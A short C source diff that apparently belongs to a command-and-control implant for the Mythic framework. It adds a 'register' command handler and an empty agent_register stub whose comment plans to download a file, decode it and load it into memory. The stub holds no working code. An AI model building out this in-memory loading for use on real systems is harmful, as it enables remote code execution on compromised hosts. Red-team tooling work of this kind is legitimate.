@@ -69,6 +69,12 @@ void agent_getuid(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 	#endif
 }
 
+void agent_register(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
+	// TODO pull down file, decode and load into memory, perform post, print to debug console.
+	// Easiest way to do this is probably to define a completely new message type (MESSAGE_TYPE_UPLOAD) and associated structs
+	// Even though Mythic treats it as a post_response, our translation container can handle that bit
+}
+
 void process_task(TaskInfo *task, AgentState *state, AgentCapabilities *cap) {
 	if (MSVCRT$strcmp(task->command, "exit") == 0) {
 		#ifdef CELEBI_DEBUG
@@ -85,6 +91,15 @@ void process_task(TaskInfo *task, AgentState *state, AgentCapabilities *cap) {
 		#endif
 		
 		agent_getuid(state, cap, task);
+		return;
+	}
+	
+	if (MSVCRT$strcmp(task->command, "register") == 0) {
+		#ifdef CELEBI_DEBUG
+		dprintf("Received register command with file UUID %s.", task->parameters);
+		#endif
+		
+		agent_register(state, cap, task);
 		return;
 	}
 	
